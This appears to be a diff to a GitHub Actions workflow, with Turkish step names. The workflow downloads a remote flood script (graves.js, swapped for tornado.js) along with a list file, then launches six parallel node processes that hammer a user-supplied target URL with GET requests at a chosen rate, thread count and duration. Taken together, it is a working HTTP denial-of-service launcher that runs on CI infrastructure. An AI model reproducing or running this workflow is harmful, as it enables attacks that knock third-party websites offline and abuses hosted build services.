@@ -26,10 +26,10 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/3Qw85/graves.js
+        wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
         wget https://curl.by/v_GPh/fres.txt
-        chmod +x graves.js
-        npm i hpack colors
+        chmod +x tornado.js
+        npm install
     - name: run
       run: |
         TARGET="${{ inputs.target }}"
@@ -38,7 +38,7 @@ jobs:
         
         PIDS=()
         for i in {1..6}; do
-          sudo timeout $TIME node graves.js GET "$TARGET" 90 10 "$RATE" fres.txt --query 1 --http 2 --full --ratelimit --flood
+          sudo timeout $TIME node tornado.js GET "$TARGET" 95 16 "$RATE" fres.txt --full  --query 3
           PIDS+=($!)
         done
         
